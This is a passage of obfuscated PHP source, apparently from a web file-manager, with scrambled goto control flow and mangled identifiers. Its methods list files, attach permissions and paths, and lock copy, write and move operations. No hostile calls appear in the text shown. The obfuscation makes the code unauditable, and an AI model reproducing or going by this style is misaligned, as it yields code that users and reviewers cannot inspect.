(!$B¾­÷„¹Ã‹) { return; } goto eÔŸœÆÁœ; eÔŸœÆÁœ: $dÓÌ«°· = array($bĞßãÂÙÕ[476] => array($bĞßãÂÙÕ[7], $B¾­÷„¹Ã‹)); $CÚ½š«…× = array($bĞßãÂÙÕ[476], $bĞßãÂÙÕ[401], $bĞßãÂÙÕ[477] => $bĞßãÂÙÕ[478]); $Bâ‡Š Ğµ„ = $this->field($CÚ½š«…×)->where($dÓÌ«°·)->group($bĞßãÂÙÕ[479])->select(); goto A¬¼±ô½Ê; B·×‡¥ˆÌ: unset($D‚è‡½©ó); goto cêÀ•â²¼; E½³»á®ëŠ: $bĞßãÂÙÕ =& $_SERVER[¬ı§†‰ú˜¼]; $B¾­÷„¹Ã‹ = array(); $a…öÀºö’‡ = array($bĞßãÂÙÕ[202] => 0, $bĞßãÂÙÕ[203] => 0); goto AÉÃí†ñª×; cêÀ•â²¼: } protected function _listAppendAuth(&$CîŞòªÁîÑ) { goto fí¤–·à­; A‡ÊÓ‰¶ï: foreach ($CîŞòªÁîÑ as $E†ôé‡ñÄ) { if ($E†ôé‡ñÄ[$bòëœ„É¥š[402]] == self::TYPE_GROUP) { $cùàôÕĞ‘[] = $E†ôé‡ñÄ[$bòëœ„É¥š[394]]; } } if (!$cùàôÕĞ‘) { return; } $eÉÑÈî Óˆ = array_to_keyvalue($CîŞòªÁîÑ, $bòëœ„É¥š[394]); goto B¶›¦éö‹Æ; fí¤–·à­: $bòëœ„É¥š =& $_SERVER[¬ı§†‰ú˜¼]; if (!defined($bòëœ„É¥š[452])) { return; } $cùàôÕĞ‘ = array(); goto A‡ÊÓ‰¶ï; B¶›¦éö‹Æ: $D¿ç¸¥¸”¨ = Model($bòëœ„É¥š[480])->getSourceList($cùàôÕĞ‘, $eÉÑÈî Óˆ); foreach ($CîŞòªÁîÑ as $CËÆœ³ç => &$E†ôé‡ñÄ) { $E†ôé‡ñÄ[$bòëœ„É¥š[404]] = $D¿ç¸¥¸”¨[$E†ôé‡ñÄ[$bòëœ„É¥š[394]]]; if (!$E†ôé‡ñÄ[$bòëœ„É¥š[404]] && $E†ôé‡ñÄ[$bòëœ„É¥š[402]] == self::TYPE_GROUP) { $E†ôé‡ñÄ[$bòëœ„É¥š[404]] = Action($bòëœ„É¥š[481])->pathGroupAuthMake($E†ôé‡ñÄ[$bòëœ„É¥š[482]]); if (!$E†ôé‡ñÄ[$bòëœ„É¥š[404]] && !_get($GLOBALS, $bòëœ„É¥š[483])) { $E†ôé‡ñÄ[$bòëœ„É¥š[195]] = !1; $E†ôé‡ñÄ[$bòëœ„É¥š[194]] = !1; } } if ($E†ôé‡ñÄ[$bòëœ„É¥š[404]]) { $E†ôé‡ñÄ[$bòëœ„É¥š[195]] = AuthModel::authCheckEdit($E†ôé‡ñÄ[$bòëœ„É¥š[404]][$bòëœ„É¥š[405]]); $E†ôé‡ñÄ[$bòëœ„É¥š[194]] = AuthModel::authCheckView($E†ôé‡ñÄ[$bòëœ„É¥š[404]][$bòëœ„É¥š[405]]); } $this->groupPathDisplay($E†ôé‡ñÄ); } unset($E†ôé‡ñÄ); goto eÚÆ‹«ëŒç; eÚÆ‹«ëŒç: } public function groupPathDisplay(&$f…‘®õÔŒñ) { goto aÊõõ±Àè‹; BŒœÓ¸µè¹: $f…‘®õÔŒñ[$CáÊÁâ¨ç·[486]] = $F¬­¬º•›Û[$CáÊÁâ¨ç·[476]]; $f…‘®õÔŒñ[$CáÊÁâ¨ç·[487]] = $F¬­¬º•›Û[$CáÊÁâ¨ç·[485]]; $f…‘®õÔŒñ[$CáÊÁâ¨ç·[488]] = $F¬­¬º•›Û[$CáÊÁâ¨ç·[489]]; goto C·ÆŒ¶‚ê; aÊõõ±Àè‹: $CáÊÁâ¨ç· =& $_SERVER[¬ı§†‰ú˜¼]; if ($f…‘®õÔŒñ[$CáÊÁâ¨ç·[402]] != self::TYPE_GROUP) { return; } $F¬­¬º•›Û = Model($CáÊÁâ¨ç·[484])->getInfo($f…‘®õÔŒñ[$CáÊÁâ¨ç·[482]]); goto aÆ ÖÃ·¶; aÆ ÖÃ·¶: $bô¨õ‹àÉØ = $this->parentLevelArray($F¬­¬º•›Û[$CáÊÁâ¨ç·[485]]); $aøâ òó–× = $CáÊÁâ¨ç·[33]; foreach ($bô¨õ‹àÉØ as $e¨ÏÖäÆñŞ) { $fˆç½‰ôÉ° = Model($CáÊÁâ¨ç·[484])->getInfo($e¨ÏÖäÆñŞ); $aøâ òó–× .= $fˆç½‰ôÉ°[$CáÊÁâ¨ç·[85]][$CáÊÁâ¨ç·[394]] . $CáÊÁâ¨ç·[47]; } goto BŒœÓ¸µè¹; C·ÆŒ¶‚ê: $f…‘®õÔŒñ[$CáÊÁâ¨ç·[490]] = $aøâ òó–× . $F¬­¬º•›Û[$CáÊÁâ¨ç·[85]][$CáÊÁâ¨ç·[394]]; goto eˆ¡‘¹¼Û¤; eˆ¡‘¹¼Û¤: } protected function _listAppendPath(&$fõˆˆ·ğ½Å) { goto a‹‚¤åÍ ; a‹‚¤åÍ : $Fñä‘êâ‡¬ =& $_SERVER[¬ı§†‰ú˜¼]; static $F‚¿³„ä¸Õ = array(); $CøÒ¢¶ğƒ¦ = array(); goto EõÎ™İÑ; FîàŠÏà¬†: $CøÒ¢¶ğƒ¦ = array_unique($CøÒ¢¶ğƒ¦); if (count($CøÒ¢¶ğƒ¦) > 0) { $FÊğ——³’ë = array($Fñä‘êâ‡¬[408] => array($Fñä‘êâ‡¬[409], $CøÒ¢¶ğƒ¦)); if (count($CøÒ¢¶ğƒ¦) == 1) { $A…´†¾À¢ = $this->sourceInfo($CøÒ¢¶ğƒ¦[0]); $DšÑÚÆÚˆÚ = is_array($A…´†¾À¢) ? array($A…´†¾À¢) : !1; } else { $DšÑÚÆÚˆÚ = $this->field($Fñä‘êâ‡¬[491])->where($FÊğ——³’ë)->select(); } if (!$DšÑÚÆÚˆÚ) { $DšÑÚÆÚˆÚ = array(); } foreach ($DšÑÚÆÚˆÚ as $EÆßã—–Î) { $F‚¿³„ä¸Õ[$EÆßã—–Î[$Fñä‘êâ‡¬[394]]] = $EÆßã—–Î[$Fñä‘êâ‡¬[28]]; } } $eÇÈ÷ïàõ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto c¹Ò££×°à; EõÎ™İÑ: $C–œ‚ÀÙ‹Ò = array(); foreach ($fõˆˆ·ğ½Å as &$dÉåŸ‹Ã½Œ) { $cíñŠ–ùÂ = $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[401]] == $Fñä‘êâ‡¬[87]; if ($cíñŠ–ùÂ) { $F‚¿³„ä¸Õ[$dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[394]]] = $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[28]]; } if (isset($C–œ‚ÀÙ‹Ò[$dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[485]]])) { continue; } $C–œ‚ÀÙ‹Ò[$dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[485]]] = !0; $d§Ç†ÁÉí© = $this->parentLevelArray($dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[485]]); foreach ($d§Ç†ÁÉí© as $b¤ß®ÏÍÀà => $Eå…Óå‚«») { if ($b¤ß®ÏÍÀà != 0 && !isset($F‚¿³„ä¸Õ[$Eå…Óå‚«»])) { $CøÒ¢¶ğƒ¦[] = $Eå…Óå‚«»; } } } unset($dÉåŸ‹Ã½Œ); goto FîàŠÏà¬†; c¹Ò££×°à: $cï°¯›‹İÅ = array(); $AÓ‰îù¬æÀ = array(); foreach ($fõˆˆ·ğ½Å as &$dÉåŸ‹Ã½Œ) { goto c‹î¯¦£ÖÄ; B÷¾Ù×šïÖ: if (intval($dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[402]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($dÉåŸ‹Ã½Œ, $d§Ç†ÁÉí©, $eÇÈ÷ïàõ); } goto d³·ˆ¤Ş©ã; Bœ…˜¯´ƒÔ: $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[493]] = str_replace($Fñä‘êâ‡¬[494], $Fñä‘êâ‡¬[8], $BÜé¸ßÌ¨©); $cïèÑšÍÛê = trim($dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[493]], $Fñä‘êâ‡¬[8]); if ($dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[476]] == $Fñä‘êâ‡¬[495] && $cïèÑšÍÛê) { $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[28]] = $cïèÑšÍÛê; } goto B÷¾Ù×šïÖ; c‹î¯¦£ÖÄ: $e•ó»ƒ‚·‰ = $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[485]]; if (isset($AÓ‰îù¬æÀ[$e•ó»ƒ‚·‰])) { $BÜé¸ßÌ¨© = $cï°¯›‹İÅ[$e•ó»ƒ‚·‰]; } else { $d§Ç†ÁÉí© = $this->parentLevelArray($dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[485]]); $Cõ˜åÖ‡‡Û = $Fñä‘êâ‡¬[492] . $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[402]] . $Fñä‘êâ‡¬[438] . $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[482]]; if ($cï°¯›‹İÅ[$Cõ˜åÖ‡‡Û]) { $BÜé¸ßÌ¨© = $cï°¯›‹İÅ[$Cõ˜åÖ‡‡Û]; } else { $BÜé¸ßÌ¨© = $this->_listAppendPathRoot($dÉåŸ‹Ã½Œ, $d§Ç†ÁÉí©); $cï°¯›‹İÅ[$Cõ˜åÖ‡‡Û] = $BÜé¸ßÌ¨©; } foreach ($d§Ç†ÁÉí© as $b¤ß®ÏÍÀà => $Eå…Óå‚«») { if ($b¤ß®ÏÍÀà == 0 && $BÜé¸ßÌ¨© && $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[402]] == self::TYPE_GROUP) { continue; } if (isset($F‚¿³„ä¸Õ[$Eå…Óå‚«»])) { $BÜé¸ßÌ¨© .= $F‚¿³„ä¸Õ[$Eå…Óå‚«»] . $Fñä‘êâ‡¬[8]; } } if ($d§Ç†ÁÉí©) { $BÜé¸ßÌ¨© .= $dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[28]]; } $cï°¯›‹İÅ[$e•ó»ƒ‚·‰] = $BÜé¸ßÌ¨©; } if ($dÉåŸ‹Ã½Œ[$Fñä‘êâ‡¬[401]]) { $BÜé¸ßÌ¨© .= $Fñä‘êâ‡¬[8]; } goto Bœ…˜¯´ƒÔ; d³·ˆ¤Ş©ã: } goto Aø»Ÿã†ˆ; Aø»Ÿã†ˆ: unset($dÉåŸ‹Ã½Œ); return $fõˆˆ·ğ½Å; goto a®ËËğÛ¹¢; a®ËËğÛ¹¢: } private function _listAppendPathRecycle(&$fø¨ÔŞï—×, $E‹äÖ×••, $e›öÅÔ¦ó‡) { goto C„¦™†÷¹®; C„¦™†÷¹®: $bë–«ã¸’¢ =& $_SERVER[¬ı§†‰ú˜¼]; if (!in_array($e›öÅÔ¦ó‡, $E‹äÖ×••) && $fø¨ÔŞï—×[$bë–«ã¸’¢[394]] != $e›öÅÔ¦ó‡) { return; } $DÉÔ›»ìê = explode($bë–«ã¸’¢[8], trim($fø¨ÔŞï—×[$bë–«ã¸’¢[493]], $bë–«ã¸’¢[8])); goto CêÑÒ†±Œ; e¯—¸ÙË¬œ: if ($fø¨ÔŞï—×[$bë–«ã¸’¢[394]] == $e›öÅÔ¦ó‡) { $fø¨ÔŞï—×[$bë–«ã¸’¢[485]] = $bë–«ã¸’¢[497]; $fø¨ÔŞï—×[$bë–«ã¸’¢[476]] = $bë–«ã¸’¢[495]; $fø¨ÔŞï—×[$bë–«ã¸’¢[28]] = LNG($bë–«ã¸’¢[496]); } $fø¨ÔŞï—×[$bë–«ã¸’¢[498]] = $bë–«ã¸’¢[499]; goto F¶ç½ˆõ°¼; CêÑÒ†±Œ: $eÆ™ ¬ßáÚ = implode($bë–«ã¸’¢[8], array_slice($DÉÔ›»ìê, 2)); $fø¨ÔŞï—×[$bë–«ã¸’¢[493]] = $bë–«ã¸’¢[8] . LNG($bë–«ã¸’¢[496]) . $bë–«ã¸’¢[8] . ltrim($eÆ™ ¬ßáÚ, $bë–«ã¸’¢[8]); $fø¨ÔŞï—×[$bë–«ã¸’¢[485]] = $bë–«ã¸’¢[497] . implode($bë–«ã¸’¢[47], array_slice($E‹äÖ×••, 1)) . $bë–«ã¸’¢[47]; goto e¯—¸ÙË¬œ; F¶ç½ˆõ°¼: } protected function _listAppendPathRoot(&$b¼¢ÓæÆ’§, $D·¢á“®«Æ) { $cŒà‚ßŠ„‡ =& $_SERVER[¬ı§†‰ú˜¼]; $fš…ƒ…´´ê = $cŒà‚ßŠ„‡[33]; if ($b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[402]] == self::TYPE_USER) { if (defined($cŒà‚ßŠ„‡[452]) && $b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[482]] == USER_ID) { $fš…ƒ…´´ê = LNG($cŒà‚ßŠ„‡[500]); if (!$D·¢á“®«Æ) { $b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[28]] = $fš…ƒ…´´ê; } } else { $FŠªÂÛÜåÌ = Model($cŒà‚ßŠ„‡[501])->getInfoSimple($b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[482]]); $fš…ƒ…´´ê = LNG($cŒà‚ßŠ„‡[502]) . $cŒà‚ßŠ„‡[160] . $FŠªÂÛÜåÌ[$cŒà‚ßŠ„‡[28]] . $cŒà‚ßŠ„‡[503]; } } else { if ($b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[402]] == self::TYPE_GROUP) { $FŠªÂÛÜåÌ = Model($cŒà‚ßŠ„‡[484])->getInfoSimple($b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[482]]); $fš…ƒ…´´ê = $FŠªÂÛÜåÌ[$cŒà‚ßŠ„‡[28]]; } else { if ($b¼¢ÓæÆ’§[$cŒà‚ßŠ„‡[402]] == self::TYPE_SYSTEM) { $fš…ƒ…´´ê = $cŒà‚ßŠ„‡[504]; } } } $fš…ƒ…´´ê = $fš…ƒ…´´ê ? $cŒà‚ßŠ„‡[8] . $fš…ƒ…´´ê . $cŒà‚ßŠ„‡[8] : $cŒà‚ßŠ„‡[8]; return $fš…ƒ…´´ê; } protected function _listAppendUser(&$AºÛ‡”ãø) { goto cÎğµƒòĞ; B‚ø©ÔÁ»: $CÜá­«˜öù = array_merge($AÛøêË«ò, $aæå­Œ¸²Ù); $FßÕõÀÒÆñ = Model($b÷ÂˆÃˆŒç[505])->userListInfo($CÜá­«˜öù); foreach ($AºÛ‡”ãø as &$F¢³ïêŠí) { $EëÈ¸ô‰£ = $F¢³ïêŠí[$b÷ÂˆÃˆŒç[430]]; $F¢³ïêŠí[$b÷ÂˆÃˆŒç[430]] = $FßÕõÀÒÆñ[$EëÈ¸ô‰£] ? $FßÕõÀÒÆñ[$EëÈ¸ô‰£] : !1; $EëÈ¸ô‰£ = $F¢³ïêŠí[$b÷ÂˆÃˆŒç[432]]; $F¢³ïêŠí[$b÷ÂˆÃˆŒç[432]] = $FßÕõÀÒÆñ[$EëÈ¸ô‰£] ? $FßÕõÀÒÆñ[$EëÈ¸ô‰£] : !1; if (isset($F¢³ïêŠí[$b÷ÂˆÃˆŒç[443]]) && $F¢³ïêŠí[$b÷ÂˆÃˆŒç[443]][$b÷ÂˆÃˆŒç[506]]) { $e¤ªã£Û—Ê = $GLOBALS[$b÷ÂˆÃˆŒç[6]][$b÷ÂˆÃˆŒç[88]][$b÷ÂˆÃˆŒç[507]]; if ($F¢³ïêŠí[$b÷ÂˆÃˆŒç[443]][$b÷ÂˆÃˆŒç[508]] <= time() - $e¤ªã£Û—Ê) { $this->metaSet($F¢³ïêŠí[$b÷ÂˆÃˆŒç[394]], $b÷ÂˆÃˆŒç[506], null); $this->metaSet($F¢³ïêŠí[$b÷ÂˆÃˆŒç[394]], $b÷ÂˆÃˆŒç[508], null); unset($F¢³ïêŠí[$b÷ÂˆÃˆŒç[443]][$b÷ÂˆÃˆŒç[506]]); continue; } $e´®Ÿö½Øå = $F¢³ïêŠí[$b÷ÂˆÃˆŒç[443]][$b÷ÂˆÃˆŒç[506]]; $F¢³ïêŠí[$b÷ÂˆÃˆŒç[443]][$b÷ÂˆÃˆŒç[509]] = Model($b÷ÂˆÃˆŒç[505])->getInfoSimpleOuter($e´®Ÿö½Øå); } } goto FŠÁòáÜÚ¸; cÎğµƒòĞ: $b÷ÂˆÃˆŒç =& $_SERVER[¬ı§†‰ú˜¼]; $AÛøêË«ò = array_to_keyvalue($AºÛ‡”ãø, $b÷ÂˆÃˆŒç[33], $b÷ÂˆÃˆŒç[430]); $aæå­Œ¸²Ù = array_to_keyvalue($AºÛ‡”ãø, $b÷ÂˆÃˆŒç[33], $b÷ÂˆÃˆŒç[432]); goto B‚ø©ÔÁ»; FŠÁòáÜÚ¸: unset($F¢³ïêŠí); goto Cù–Ü»§Â†; Cù–Ü»§Â†: } public function parentLevelArray($fæéÜâ…®©) { $f¾¥Ûòòˆ– =& $_SERVER[¬ı§†‰ú˜¼]; $fæéÜâ…®© = explode($f¾¥Ûòòˆ–[47], trim($fæéÜâ…®©, $f¾¥Ûòòˆ–[47])); return array_remove_value($fæéÜâ…®©, $f¾¥Ûòòˆ–[495]); } public function listAll($d“‰ã‰‰) { goto b¸¶Œ­µÏ; dˆµŸœß«à: $a³ÀÆìÙ = array(); foreach ($c†ÕØÏŞß as $CÉ ¨¿ßƒ× => $Dà¸Éæ”ó…) { goto Aª‘¦šóâ; a„ë¿Ü—ã‚: for ($Bç§ç™ˆ—× = 0; $Bç§ç™ˆ—× < count($DÃ·…øøŞ); $Bç§ç™ˆ—×++) { $Bô¸ì†Šº .= $c†ÕØÏŞß[$DÃ·…øøŞ[$Bç§ç™ˆ—×]][$e¤†’Ñê[28]] . $e¤†’Ñê[8]; } $Bô¸ì†Šº .= $Dà¸Éæ”ó…[$e¤†’Ñê[28]]; if ($Dà¸Éæ”ó…[$e¤†’Ñê[401]]) { $Bô¸ì†Šº .= $e¤†’Ñê[8]; } goto a¥»ŠªÕ; EÉ£öö–¥: if (!$Dà¸Éæ”ó…[$e¤†’Ñê[401]]) { $A¾ˆ¬µš±‚[$e¤†’Ñê[445]] = $Dà¸Éæ”ó…[$e¤†’Ñê[445]]; $A¾ˆ¬µš±‚[$e¤†’Ñê[86]] = $Dà¸Éæ”ó…[$e¤†’Ñê[76]]; } $a³ÀÆìÙ[] = $A¾ˆ¬µš±‚; goto FÜ»…äÖ¤ó; a¥»ŠªÕ: $Bô¸ì†Šº = str_replace($e¤†’Ñê[494], $e¤†’Ñê[8], $Bô¸ì†Šº); $Bô¸ì†Šº = str_replace($e¤†’Ñê[494], $e¤†’Ñê[8], $Bô¸ì†Šº); $A¾ˆ¬µš±‚ = array($e¤†’Ñê[412] => str_replace($e¤†’Ñê[494], $e¤†’Ñê[8], $Bô¸ì†Šº), $e¤†’Ñê[516] => intval($Dà¸Éæ”ó…[$e¤†’Ñê[401]]), $e¤†’Ñê[85] => $this->pathInfoFilter($Dà¸Éæ”ó…)); goto EÉ£öö–¥; Aª‘¦šóâ: $DÃ·…øøŞ = $this->parentLevelArray($Dà¸Éæ”ó…[$e¤†’Ñê[485]]); array_shift($DÃ·…øøŞ); $Bô¸ì†Šº = $c•êŒõ”÷¢; goto a„ë¿Ü—ã‚; FÜ»…äÖ¤ó: } return $a³ÀÆìÙ; goto F•ğ‚Ì‡¹; e§‹¸¬Ì‰: $b‡é„Òóæì = $e¤†’Ñê[514]; $EßË¦çÁ¯’ = "\114\x45\106\124\x20\112\117\x49\116\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\145\x20\x66\151\x6c\145\x20\157\156\x20\x73\x6f\165\x72\x63\x65\x2e\x66\x69\x6c\145\x49\x44\x20\75\40\x66\151\154\x65\x2e\146\151\154\145\x49\104"; $c†ÕØÏŞß = $this->alias($e¤†’Ñê[515])->field($b‡é„Òóæì)->where($eö²”õÜÜÌ)->join($EßË¦çÁ¯’)->select(); goto C¾Â”à­šŒ; Dâº²«¿ö: $c†ÕØÏŞß = array_to_keyvalue($c†ÕØÏŞß, $e¤†’Ñê[394]); $c•êŒõ”÷¢ = "\57{$F‰³ùÈÊ…[$e¤†’Ñê[28]]}\x2f"; $c•êŒõ”÷¢ = $c•êŒõ”÷¢ == $e¤†’Ñê[494] ? $e¤†’Ñê[8] : $c•êŒõ”÷¢; goto dˆµŸœß«à; b¸¶Œ­µÏ: $e¤†’Ñê =& $_SERVER[¬ı§†‰ú˜¼]; $F‰³ùÈÊ… = $this->sourceInfo($d“‰ã‰‰); $eö²”õÜÜÌ = array($e¤†’Ñê[510] => array($e¤†’Ñê[511], $F‰³ùÈÊ…[$e¤†’Ñê[485]] . $d“‰ã‰‰ . $e¤†’Ñê[512]), $e¤†’Ñê[513] => 0); goto e§‹¸¬Ì‰; C¾Â”à­šŒ: $this->_listAppendAuth($c†ÕØÏŞß); $this->_listAppendUser($c†ÕØÏŞß); $this->_listAppendPath($c†ÕØÏŞß); goto Dâº²«¿ö; F•ğ‚Ì‡¹: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($DÍàÄµ ) { goto FÆÏÛêîïÈ; c®Œ˜ê«™á: $e¦™¹•Âå = 1; $this->_lockEvent($DÍàÄµ , array($E°¬¨ÛìÒ[518], $E°¬¨ÛìÒ[519]), $e¦™¹•Âå); $this->_lockParent($DÍàÄµ , array($E°¬¨ÛìÒ[519]), $e¦™¹•Âå); goto c†§ÍÎ‡÷œ; c†§ÍÎ‡÷œ: $this->_lockEvent($DÍàÄµ , array($E°¬¨ÛìÒ[520], $E°¬¨ÛìÒ[521]), $e¦™¹•Âå); $this->_lockCheckEnd($E°¬¨ÛìÒ[517], $DÍàÄµ ); goto C™º‹¸½µ¢; FÆÏÛêîïÈ: $E°¬¨ÛìÒ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($E°¬¨ÛìÒ[517], $DÍàÄµ ); goto c®Œ˜ê«™á; C™º‹¸½µ¢: } public function lockCopyEnd($eÙ˜¨à–Û‹) { $D¦Ò•°ùº =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->allowLock()) { return; } $a‘Ç“×²ß‚ = 0; $this->_lockEvent($eÙ˜¨à–Û‹, array($D¦Ò•°ùº[518], $D¦Ò•°ùº[519]), $a‘Ç“×²ß‚); $this->_lockParent($eÙ˜¨à–Û‹, array($D¦Ò•°ùº[519]), $a‘Ç“×²ß‚); $this->_lockEvent($eÙ˜¨à–Û‹, array($D¦Ò•°ùº[520], $D¦Ò•°ùº[521]), $a‘Ç“×²ß‚); } public function lockWriteStart($eƒÈ”¯§ğÆ, $f·ÃÙÎ »ï = '') { goto fÍ¦ŒÒ“; B¯ÍÜ†ÉÜ¯: $this->_lockParent($eƒÈ”¯§ğÆ, array($bƒ†‰Æˆ¸‡[517], $bƒ†‰Æˆ¸‡[519]), $aËÁê¹¼µ); $this->_lockCheckEnd($bƒ†‰Æˆ¸‡[518], $eƒÈ”¯§ğÆ); goto c—šÌ·; B¾²ÆĞê©: $aËÁê¹¼µ = 1; $this->_lockKey($bƒ†‰Æˆ¸‡[522] . $eƒÈ”¯§ğÆ . $bƒ†‰Æˆ¸‡[95] . $f·ÃÙÎ »ï, $aËÁê¹¼µ); $this->_lockEvent($eƒÈ”¯§ğÆ, array($bƒ†‰Æˆ¸‡[517], $bƒ†‰Æˆ¸‡[519]), $aËÁê¹¼µ); goto B¯ÍÜ†ÉÜ¯; fÍ¦ŒÒ“: $bƒ†‰Æˆ¸‡ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($bƒ†‰Æˆ¸‡[518], $eƒÈ”¯§ğÆ); goto B¾²ÆĞê©; c—šÌ·: } public function lockWriteEnd($DÃ¨ñ»•°†, $C‰öãÜšù¸ = '') { $A–¦Ÿã¡Ğ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->allowLock()) { return; } $fˆôÈŞœ—ƒ = 0; $this->_lockKey($A–¦Ÿã¡Ğ[522] . $DÃ¨ñ»•°† . $A–¦Ÿã¡Ğ[95] . $C‰öãÜšù¸, $fˆôÈŞœ—ƒ); $this->_lockEvent($DÃ¨ñ»•°†, array($A–¦Ÿã¡Ğ[517], $A–¦Ÿã¡Ğ[519]), $fˆôÈŞœ—ƒ); $this->_lockParent($DÃ¨ñ»•°†, array($A–¦Ÿã¡Ğ[517], $A–¦Ÿã¡Ğ[519]), $fˆôÈŞœ—ƒ); } public function lockMoveStart($E‹äŠÂÀ“ä) { goto Eöî¡Í‡É; Béšææé: $BÑÇØÄ±˜ = 1; $this->_lockKey($cË¾ÕÂ[523] . $E‹äŠÂÀ“ä, $BÑÇØÄ±˜); $this->_lockEvent($E‹äŠÂÀ“ä, array($cË¾ÕÂ[517], $cË¾ÕÂ[518]), $BÑÇØÄ±˜); goto eˆäÜèÖÑ÷; eˆäÜèÖÑ÷: $this->_lockParent($E‹äŠÂÀ“ä, array($cË¾ÕÂ[517], $cË¾ÕÂ[519]), $BÑÇØÄ±˜); $this->_lockEvent($E‹äŠÂÀ“ä, array($cË¾ÕÂ[524], $cË¾ÕÂ[520], $cË¾ÕÂ[521]), $BÑÇØÄ±˜); $this->_lockCheckEnd($cË¾ÕÂ[519], $E‹äŠÂÀ“ä); goto døÈ¾Š‰é¹; Eöî¡Í‡É: $cË¾ÕÂ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->allowLock()) { return; } $this->_lockCheck($cË¾ÕÂ[519], $E‹äŠÂÀ“ä); goto Béšææé; døÈ¾Š‰é¹: } public function lockMoveEnd($E†¦‹êÔ„) { goto dà·æò˜è²; CÏŸ¿§î„: $this->_lockEvent($E†¦‹êÔ„, array($b»‚Å„İ°Æ[524], $b»‚Å„İ°Æ[520], $b»‚Å„İ°Æ[521]), $fãñ¥º„¹ù); goto AàéÙÔ“¤“; fç–èá·øå: $this->_lockKey($b»‚Å„İ°Æ[523] . $E†¦‹êÔ„, $fãñ¥º„¹ù); $this->_lockEvent($E†¦‹êÔ„, array($b»‚Å„İ°Æ[517], $b»‚Å„İ°Æ[518]), $fãñ¥º„¹ù); $this->_lockParent($E†¦‹êÔ„, array($b»‚Å„İ°Æ[517], $b»‚Å„İ°Æ[519]), $fãñ¥º„¹ù); goto CÏŸ¿§î„; dà·æò˜è²: $b»‚Å„İ°Æ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->allowLock()) { return; } $fãñ¥º„¹ù = 0; goto fç–èá·øå; AàéÙÔ“¤“: } private function _lockCheck($c«¾ùˆ›©Ş, $DÔ´£Àß„Å) { goto B´È‘ªî™; B´È‘ªî™: $bŠÍèºñ¿ =& $_SERVER[¬ı§†‰ú˜¼]; $fîˆº—í = $this->sourceInfo($DÔ´£Àß„Å); $DáäÖĞ¼ê = $c«¾ùˆ›©Ş . $bŠÍèºñ¿[95] . $DÔ´£Àß„Å; goto DŸì‹ÃŒ´Ù; eÁ×Î‹¶ÀÓ: CacheLock::setErrorMsg($bŠÍèºñ¿[160] . htmlspecialchars($fîˆº—í[$bŠÍèºñ¿[28]]) . $bŠÍèºñ¿[503] . $Eö—²¨ê†); $this->_lockKey($DáäÖĞ¼ê, 1); $this->_lockKey($DáäÖĞ¼ê, 0); goto d²¡—äÂå„; DŸì‹ÃŒ´Ù: $this->_lockTimeStart[$DáäÖĞ¼ê] = timeFloat(); if (!is_array($fîˆº—í)) { return; } $Eö—²¨ê† = LNG($bŠÍèºñ¿[525]); goto eÁ×Î‹¶ÀÓ; d²¡—äÂå„: $FÏë°š©õ‡ = array_reverse($this->parentLevelArray($fîˆº—í[$bŠÍèºñ¿[485]])); foreach ($FÏë°š©õ‡ as $dŞù¢ù…·) { $DáäÖĞ¼ê = $c«¾ùˆ›©Ş . $bŠÍèºñ¿[526] . $dŞù¢ù…·; if (CacheLock::lockGet($bŠÍèºñ¿[527] . $DáäÖĞ¼ê)) { $fîˆº—í = $this->sourceInfo($dŞù¢ù…·); CacheLock::setErrorMsg($bŠÍèºñ¿[160] . htmlspecialchars($fîˆº—í[$bŠÍèºñ¿[28]]) . $bŠÍèºñ¿[503] . $Eö—²¨ê†); $this->_lockKey($DáäÖĞ¼ê, 1); $this->_lockKey($DáäÖĞ¼ê, 0); } } goto a±ÓÓÄ­­¹; a±ÓÓÄ­­¹: } private function _lockCheckEnd($fÃïâ„’Ç, $EÃÓ§¡ª¤‹) { goto E¨ÃŠÄªº; A­ƒµÂ‘£: if (!isset($this->_lockTimeStart[$f—ÁÒì–“í])) { return; } $A¥¨À’Ê± = timeFloat() - $this->_lockTimeStart[$f—ÁÒì–“í]; unset($this->_lockTimeStart[$f—ÁÒì–“í]); goto b¼ŠÂ©÷‡; b¼ŠÂ©÷‡: if ($A¥¨À’Ê± > 0.5) { unset(self::$cacheSourceInfo[$EÔäßÎ »¼[436] . $EÃÓ§¡ª¤‹]); } $C­ÈÇ‡÷í¬ = $this->sourceInfo($EÃÓ§¡ª¤‹); if (!$C­ÈÇ‡÷í¬) { show_json(LNG($EÔäßÎ »¼[105]), !1); } goto a¿í‘îÚÁ; E¨ÃŠÄªº: $EÔäßÎ »¼ =& $_SERVER[¬ı§†‰ú˜¼]; $f—ÁÒì–“í = $fÃïâ„’Ç . $EÔäßÎ 